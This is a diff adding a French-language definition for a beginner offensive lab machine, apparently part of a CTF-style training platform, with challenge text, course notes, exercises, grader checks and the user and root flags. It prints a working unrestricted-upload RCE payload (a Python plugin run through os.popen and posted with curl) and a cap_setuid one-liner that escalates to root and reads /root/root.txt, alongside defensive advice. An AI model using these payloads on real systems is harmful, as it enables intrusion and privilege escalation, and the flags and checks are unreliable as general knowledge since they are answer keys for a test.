@@ -1,0 +1,102 @@
+title: Depot
+track: offensif
+machine_os: linux
+level: debutant
+order: 7
+tags: [machine, web, téléversement, upload, rce, élévation de privilèges, capabilities, cap_setuid, linux, cve]
+summary: Machine Facile Linux - un service de greffons accepte le téléversement de fichiers sans contrôle et exécute les .py (RCE), puis une capability Linux cap_setuid mal placée sur un interpréteur mène à root. Capture le drapeau utilisateur puis le drapeau root.
+compose: docker-compose.yml
+service: attaquant
+shell: bash
+flags:
+  user: "TDM{d3p0t_upl04d_n0n_r3str31nt}"
+  root: "TDM{d3p0t_c4p4b1l1ty_s3tu1d}"
+description: |
+  **Machine : Depot · Facile · 🐧 Linux**
+
+  La cible héberge « Depot Express », un gestionnaire de **greffons**. Comme sur une machine Hack The Box,
+  examine ce que l'application accepte en entrée : si tu peux déposer un fichier qui sera **exécuté**, tu
+  obtiens du code. Objectif : drapeau **utilisateur** (`user.txt`) puis élévation vers le drapeau **root**
+  (`root.txt`).
+
+  Tout est isolé dans le réseau du lab (`internal`). **Réinitialiser** reconstruit une cible neuve.
+
+  **Pistes.**
+
+  1. Reconnaissance : `curl http://cible/` - l'application accepte un **téléversement** de greffon
+     (`POST /televerser?nom=...`) et charge les fichiers `.py`.
+  2. Rien ne valide le type du fichier : téléverse un greffon `.py` qui exécute une commande. C'est un
+     **téléversement non restreint** menant à la RCE (tu agis en tant que `depot`). Lis `user.txt`.
+  3. Énumère les **capabilities** (`getcap -r / 2>/dev/null`). Un interpréteur avec `cap_setuid` peut
+     changer d'identité et devenir root : c'est ton chemin vers `root.txt`.
+
+  Outils : `curl`, `python3`, `getcap`.
+cours: |
+  ## Téléversement de fichier non restreint et élévation par capabilities
+
+  ### Téléversement non restreint (RCE)
+
+  Quand une application accepte un fichier **sans vérifier son type/extension** et l'enregistre dans un
+  emplacement où il peut être **exécuté** (ou l'exécute elle-même), l'attaquant dépose un *webshell* ou un
+  script et obtient l'exécution de code. CVE marquantes de cette famille : **CVE-2017-12615** (Apache
+  Tomcat, upload JSP via PUT → RCE), **CVE-2019-8942** (WordPress), **CVE-2021-22005** (vCenter).
+
+  Ici le service charge (exécute) tout greffon `.py` déposé :
+
+  ```
+  cat > /tmp/g.py <<'PY'
+  import os
+  print(os.popen("id; cat /home/depot/user.txt").read())
+  PY
+  curl -s --data-binary @/tmp/g.py "http://cible/televerser?nom=g.py"
+  ```
+
+  ### Élévation de privilèges par capabilities Linux
+
+  Les **capabilities** découpent les privilèges de root en unités. Posées sur un binaire, elles lui
+  donnent ce pouvoir sans SUID complet. `cap_setuid` permet à un processus de **changer d'UID** : sur un
+  interpréteur, c'est un root immédiat. On les énumère avec `getcap -r / 2>/dev/null` :
+
+  ```
+  getcap -r / 2>/dev/null                       # repère python avec cap_setuid
+  /usr/local/bin/python3-cap -c 'import os; os.setuid(0); os.system("cat /root/root.txt")'
+  ```
+
+  ### Côté défense
+
+  Pour l'upload : liste blanche stricte d'extensions/types, stockage **hors** d'un répertoire exécutable,
+  renommage, et jamais d'exécution du contenu téléversé. Pour les capabilities : n'en poser aucune sur un
+  interpréteur ou un binaire polyvalent ; auditer avec `getcap -r /`.
+docs:
+  - title: OWASP - Unrestricted File Upload
+    url: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
+  - title: GTFOBins - Capabilities
+    url: https://gtfobins.github.io/#+capabilities
+exercises:
+  - id: reconnaissance
+    title: Comprendre le service
+    description: |
+      Récupère la page d'accueil et repère le point de téléversement des greffons. Enregistre la page dans
+      `/root/reponses/accueil.html`.
+    hint: "curl -s http://cible/ | tee /root/reponses/accueil.html"
+    cours: |
+      Comprendre que le service exécute les greffons `.py` déposés est la clé : c'est ce comportement qui
+      transforme un simple téléversement en exécution de code.
+    checks:
+      - desc: La page de la cible a été récupérée
+        run: grep -qi 'Depot' /root/reponses/accueil.html
+  - id: upload
+    title: RCE par téléversement
+    description: |
+      Téléverse un greffon `.py` qui exécute `id` **sur la cible** et enregistre la réponse
+      (`uid=...(depot)`) dans `/root/reponses/upload.txt`.
+    hint: |
+      printf 'import os\nprint(os.popen("id").read())\n' > /tmp/g.py
+      curl -s --data-binary @/tmp/g.py "http://cible/televerser?nom=g.py" | tee /root/reponses/upload.txt
+    cours: |
+      Obtenir la sortie de `id` prouve que ton fichier a été exécuté côté serveur (RCE) et t'indique
+      l'utilisateur de service (`depot`). De là, tu lis `user.txt` et tu cherches l'élévation via les
+      capabilities.
+    checks:
+      - desc: Le greffon téléversé s'exécute en tant que depot
+        run: grep -q 'uid=' /root/reponses/upload.txt && grep -q 'depot' /root/reponses/upload.txt
